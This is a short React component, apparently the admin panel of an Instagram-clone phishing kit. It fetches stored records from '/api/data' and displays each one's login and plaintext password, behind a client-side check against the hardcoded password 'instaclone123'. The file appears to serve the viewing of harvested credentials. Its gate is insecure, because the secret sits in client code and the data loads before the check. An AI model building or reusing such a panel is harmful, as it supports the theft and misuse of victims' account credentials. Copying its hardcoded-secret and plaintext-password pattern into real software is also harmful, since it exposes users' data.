import axios from 'axios';
import React, { useEffect, useState } from 'react';

const data = () => {
	const [data, setData] = useState([]);
	const [loading, setLoading] = useState(false);
	const [show, setShow] = useState(false);
	const [password, setPassword] = useState('');

	useEffect(() => {
		fetchData();
	}, []);

	const fetchData = async () => {
		setLoading(true);
		const res = await axios.get('/api/data');

		setData(res.data.data);
		setLoading(false);
	};

	if (!show) {
		return (
			<div style={{ padding: '10px', display: 'flex', gap: '10px' }}>
				<input
					style={{
						padding: '8px',
						outline: 'none',
					}}
					placeholder="passowrd"
					onChange={(e) => setPassword(e.target.value)}
				/>
				<button
					style={{
						background: 'f3f3f3',
						outline: 'none',
						border: 'none',
						borderRadius: '4px',
					}}
					onClick={() => {
						if (password === 'instaclone123') {
							setShow(true);
						}
					}}
				>
					Submit
				</button>
			</div>
		);
	}

	return (
		<div style={{ padding: '15px' }}>
			<div style={{ fontSize: '18px' }}>Data</div>
			{loading && 'Loading...'}
			{data?.map((item, idx) => (
				<div style={{ marginTop: '10px' }} key={idx}>
					<div>Login: {item.login}</div>
					<div>Password: {item.password}</div>
				</div>
			))}
		</div>
	);
};

export default data;
